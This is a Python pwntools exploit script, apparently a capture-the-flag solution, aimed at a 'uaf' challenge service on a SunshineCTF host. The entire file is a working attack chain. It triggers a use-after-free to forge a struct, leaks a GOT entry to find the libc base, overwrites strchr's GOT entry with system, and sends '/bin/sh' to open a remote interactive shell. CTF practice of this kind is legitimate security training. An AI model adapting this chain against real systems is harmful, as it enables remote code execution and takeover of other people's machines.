from pwn import *
import ctypes

def create_str(p, data):
        p.recvuntil("(>)")
        p.sendline("2")
        p.recvuntil(":")
        p.sendline(data)
        p.recvuntil("\n")
        return p.recvuntil("\n").split(": ")[1]

def create_int_arr(p, vals):
        p.recvuntil("(>)")
        p.sendline("1")
        p.recvuntil("?")
        p.sendline(str(len(vals)))
        for i in xrange(0, len(vals)):
                p.recvuntil(":")
                p.sendline(str(vals[i]))
        p.recvuntil("\n")
        return p.recvuntil("\n").split(": ")[1]

def free_int_arr(p, idx):
        p.recvuntil("(>)")
        p.sendline("6")
        p.recvuntil(":")
        p.sendline(str(idx))

def read_str(p, idx):
        p.recvuntil("(>)")
        p.sendline("5")
        p.recvuntil(":")
        p.sendline(str(idx))
        return p.recvline()

def edit_int_arr(p, idx, i, val):
        p.recvuntil("(>)")
        p.sendline("3")
        p.recvuntil(":")
        p.sendline(str(idx))
        p.recvuntil(":")
        p.sendline(str(i))
        p.recvuntil(":")
        p.sendline(str(val))
        p.recvline()

def disp_int_arr(p, idx):
        p.recvuntil("(>)")
        p.sendline("4")
        p.recvuntil(":")
        p.sendline(str(idx))
        return p.recvuntil("]").split("[")[1][:-1]

def main():
        #make fake struct, point to got to leak libc

        #p = process("./uaf", env={"LD_PRELOAD": "./uaf-libc.so"})
        p = remote("chal1.sunshinectf.org", 20001)
        libc = ELF("./uaf-libc.so")
        #gdb.attach(p)

        puts_got = 0x804a804
        strchr_got = 0x804a80c

        ptr = int(create_int_arr(p, [420]))
        print hex(ptr), ptr

        free_int_arr(p, ptr)
        create_str(p, p32(0x41414141) + p32(ptr + 0x10))

        ptr2 = int(create_int_arr(p, [420]))

        edit_int_arr(p,ptr,1, u32(p32(puts_got)))
        print hex(ptr2), ptr2

        leak = u32(p32(int(disp_int_arr(p, ptr2)) & 0xffffffff))
        print "leaked strchr: %s " % hex(leak)
        libc_base = leak - libc.symbols['puts']
        system = libc_base + libc.symbols['system']

        print "system: %s" % hex(system)

        edit_int_arr(p,ptr,1, u32(p32(strchr_got)))


        edit_int_arr(p, ptr2, 0, u32(p32(system), sign=True))

        p.recvuntil("(>)")
        p.sendline("/bin/sh\x00")

        p.interactive()

if __name__ == "__main__":
        main()